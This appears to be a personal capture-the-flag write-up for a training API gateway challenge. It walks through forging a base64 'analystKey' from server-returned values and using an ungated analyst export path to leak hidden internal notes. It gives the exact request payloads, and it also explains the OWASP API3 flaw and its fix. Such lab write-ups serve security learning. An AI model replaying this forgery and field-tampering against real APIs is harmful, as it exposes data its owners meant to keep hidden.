# CTF — Track 03 · HAG-03 · HELIOS API Gateway · Transcript Export Leak

> Side activity — NOT a learning record. Status: ✅ SOLVED 2026-06-21.

**Flag:** `KA{hag_transcript_export_leak_trainingflag}`

## Mission
Transcript export shares a path with an internal analyst export. Player UI shows only safe output. The verbose analyst path leaks hidden metadata including internal notes and ops flags.

## Attack chain
1. Player export (`format=player`) → `sessionSalt` + `keySpec`
2. `format=analyst-init` → `exportGrantId`
3. Compute `analystKey = base64('analyst:' + reverse(sessionSalt) + ':' + exportGrantId)`
4. Analyst export with all required fields → leaked `internalNotes` → flag

## Solved data
| item | value |
|---|---|
| sessionSalt | `S7F2` |
| exportGrantId | `grant-b92fd5` |
| compound | `analyst:2F7S:grant-b92fd5` |
| analystKey | `YW5hbHlzdDoyRjdTOmdyYW50LWI5MmZkNQ==` |
| flag | `KA{hag_transcript_export_leak_trainingflag}` |

## Solution walkthrough

### Step 1 — player export (get sessionSalt)
```javascript
payload: { format: 'player', includeMeta: false }
```
Response: `sessionSalt: "S7F2"`, keySpec: `analystKey = base64('analyst:' + reverse(sessionSalt) + ':' + exportGrantId)`.

### Step 2 — claim export grant
```javascript
payload: { format: 'analyst-init' }
```
Response: `exportGrantId: "grant-b92fd5"`.

### Step 3 — compute analystKey
```python
import base64
base64.b64encode(b'analyst:2F7S:grant-b92fd5').decode()
# → YW5hbHlzdDoyRjdTOmdyYW50LWI5MmZkNQ==
```

### Step 4 — analyst export
```javascript
payload: {
  format: 'analyst', includeMeta: true, scope: 'analyst',
  range: 'full', redactionWaiver: true,
  analystKey: 'YW5hbHlzdDoyRjdTOmdyYW50LWI5MmZkNQ=='
}
```
→ `internalNotes` leaked: ops-flag, evaluation notes, flag token.

## Key learnings

### Attack class: excessive data exposure via undocumented export path (OWASP API3)
The analyst export path was never removed or properly gated. It serialised internal metadata (`internalNotes`, `ops-flag`) that the player-facing transcript deliberately hid. The player UI provided no access to this path, but the backend accepted it from any caller who supplied the right fields.

### Shared path, different serialisation = data exposure
Player and analyst exports shared the same endpoint (`export-transcript`). The `format` field switched serialisation depth. Sensitive fields only hidden by the player serialiser were exposed via the analyst serialiser. Correct fix: separate endpoints with separate auth, or strip sensitive fields server-side regardless of format.

### Weak analystKey = base64 with no secret
Same pattern as every prior HAG challenge: `base64('analyst:' + reverse(salt) + ':' + grantId)`. The grant ID was issued by the server and the salt was returned in the player response — both values observable by the attacker. No HMAC, no secret. Trivially forgeable.

## HAG track pattern

| # | Challenge | Core vuln | Key derivation |
|---|---|---|---|
| HAG-01 | Debug echo | Debug path not removed | base64(reverse(nonce) + ':' + salt) |
| HAG-02 | Safety mode tamper | Client-controlled safetyMode | xorHex(policyBundle, reverse(salt)) |
| HAG-03 | Transcript export leak | Analyst path not gated; excess data exposure | base64('analyst:' + reverse(salt) + ':' + grantId) |
